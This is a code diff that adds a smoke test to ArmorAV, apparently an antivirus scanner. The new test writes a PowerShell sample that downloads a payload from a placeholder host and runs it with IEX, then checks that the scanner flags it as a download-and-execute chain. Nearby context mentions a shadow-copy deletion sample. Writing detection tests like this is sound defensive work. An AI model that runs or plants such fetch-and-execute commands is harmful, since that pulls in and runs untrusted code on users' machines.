@@ -12,6 +12,7 @@ internal static class Program
         try
         {
             DetectsKnownAndBenignSamples(root);
+            DetectsExecutionChains(root);
             DetectsZipTraversal(root);
             QuarantineIsAuthenticatedAndRestorable(root);
             Console.WriteLine("ArmorAV smoke tests passed.");
@@ -49,6 +50,20 @@ internal static class Program
             "a benign text sample must remain clean");
         Assert(report.Results.Single(x => x.Path.EndsWith("suspicious.ps1")).VerdictText == Verdict.Suspicious.ToString(),
             "a shadow-copy deletion command must be suspicious");
+    }
+
+    private static void DetectsExecutionChains(string root)
+    {
+        var path = Path.Combine(root, "invoice_update.ps1");
+        File.WriteAllText(path, "Invoke-WebRequest https://example.invalid/payload -OutFile $env:TEMP\\x; IEX (Get-Content $env:TEMP\\x)");
+        var report = ArmorAVService.Scan(new ScanRequest
+        {
+            Path = path,
+            DataDirectory = Path.Combine(root, "chain-app-data"),
+            UseCache = false
+        });
+        Assert(report.Results.Single().Findings.Any(x => x.Name == "Script.DownloadExecutionChain"),
+            "a download-and-execute chain must be detected");
     }
 
     private static void DetectsZipTraversal(string root)
